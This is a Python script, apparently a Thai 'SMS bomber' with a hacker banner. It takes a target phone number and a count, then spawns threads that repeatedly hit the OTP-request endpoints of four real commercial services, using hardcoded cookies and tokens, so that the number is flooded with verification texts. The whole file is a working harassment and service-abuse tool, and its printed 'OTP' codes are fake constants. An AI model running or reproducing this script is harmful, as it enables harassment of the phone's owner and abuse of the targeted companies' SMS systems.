import requests,json
import requests
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
import os
os.system("clear")


def cls():
	try:
		os.system("cls")
	except:
		os.system("clear")
		
def banner():
	bannertop = '''
	       \033[91m ███████╗███╗   ███╗███████╗                
                ██╔════╝████╗ ████║██╔════╝                
                ███████╗██╔████╔██║███████╗                
                ╚════██║██║╚██╔╝██║╚════██║                
                ███████║██║ ╚═╝ ██║███████║                
                ╚══════╝╚═╝     ╚═╝╚══════╝
           [*]   Edit : ERROR  INSTALL
           \033[91m[*]   FB : นัท'ท ยัดหมด
           [*]   TikTok : @error_hack_n
           \033[91m[*]   YouTube : ERROR INSTALL NH
        ------------------------------------'''
	print(bannertop)
	
cls()
banner()
 
phone = input(f"\033[1;92m Phone : ")
print("")
NUM = int(input("\033[1;92m Num : "))

def api3():
	requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
	print("\033[1;91m [*] OTP 587521 !")

def api4():
 requests.post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
 print("\033[1;91m [*] OTP 397560 !")

def api5():
 requests.post('https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL',json={"channelDetails":{"phoneNumber":f"+66"+phone,"channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN"},headers={'user-agent':'Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'})
 print("\033[1;91m [*] OTP 256290 !")
   
def api7():
 requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","riskMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
 print("\033[1;91m [*] OTP 839184 !")
 
for i in range(NUM):
    threading.Thread(target=api3).start()
    threading.Thread(target=api4).start()
    threading.Thread(target=api5).start()
    threading.Thread(target=api7).start()